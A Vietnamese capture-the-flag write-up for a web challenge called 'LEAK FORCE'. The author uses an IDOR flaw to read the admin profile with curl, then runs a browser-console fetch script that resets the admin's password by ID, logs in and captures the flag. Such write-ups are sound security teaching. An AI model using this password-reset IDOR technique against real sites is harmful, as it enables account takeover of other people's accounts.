---
title: LEAK FORCE

---

# LEAK FORCE
![image](https://hackmd.io/_uploads/BJQDAszAgg.png)

#### TEST

Challenge cung cấp một mã nguồn HTML http://web1.cscv.vn:9981/
![image](https://hackmd.io/_uploads/SJ8899f0gg.png)

- Trước tiên em sẽ thử các chức năng của web
- Register các thứ các thứ rồi login với username: abc2, password: abc
- Sau khi login xong thì sẽ được chuyển tới trang http://web1.cscv.vn:9981/profile.html
![image](https://hackmd.io/_uploads/HJwSEsG0le.png)

- Tại đây em thử các chức năng **Save Changes** và **Update Password** thì không có gì đặc biệt
- Với target là IDOR, thì thường admin user có thể là ID 1 (khá phổ biến)
- Em đã thử lệnh **curl** 'http://web1.cscv.vn:9981/api/profile?id=1' \ 
và kết quả trả về là

 ```
 -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.9,vi-VN;q=0.8,vi;q=0.7' \
  -H 'Connection: keep-alive' \
  -H 'If-None-Match: W/"e8-LeJvTb4wZSK6PbyPTrZ1iVWdsIM"' \
  -H 'Referer: http://web1.cscv.vn:9981/profile.html' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36' \
  --insecure
{"id":1,"fullName":"CTF Admin","username":"admin","email":"test1234@example.com","description":"New user1","avatar":"/uploads/user_undefined_1760753297965.txt","birthdate":null,"gender":null,"company":"abc"}
```

- Từ đây em đã chắc chắn `ID admin` là `1`


#### VỤT

- Khai thác IDOR: dùng chức năng đặt lại mật khẩu để lấy quyển truy cập vào tài khoản admin
- Em vào `Devtools` -> `Network` để kiểm tra có những gì
- ![image](https://hackmd.io/_uploads/HkB1dszAle.png)
- Em thử check response của `profile.js`
![image](https://hackmd.io/_uploads/Hy-7qofRgl.png)

- Từ đây em sẽ tận dụng **endpoint** từ **Network** để **reset password** của `ID=1` (**ID của admin user**) và lấy quyển truy cập tới tài khoản **Admin**

Sử dụng **console** để gửi **fetch** thay đổi mật khẩu tới `ID=1`

```
(async function() {
    const targetId = 1; 
    const newPassword = 'msec'; 
    const response = await fetch('/api/reset-password', { 
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: targetId, newPassword: newPassword }) 
    });
    const result = await response.json();
    if (response.ok) {
        console.log('Đặt lại mật khẩu thành công cho ID:', targetId, result);
    } else {
        console.error('Thất bại:', result);
    }
})();
```
Response:
![image](https://hackmd.io/_uploads/SyqJ2iMRel.png)

- Sau đó logout rồi login với `username=admin`, `password=msec` và nhận được flag
![image](https://hackmd.io/_uploads/SyxSnoM0xe.png)

**
FLAG: CSCV2025{7h3_Uni73d_N47i0ns_C0nv3n7i0n_4g4ins7_Cyb3rcrim3}**
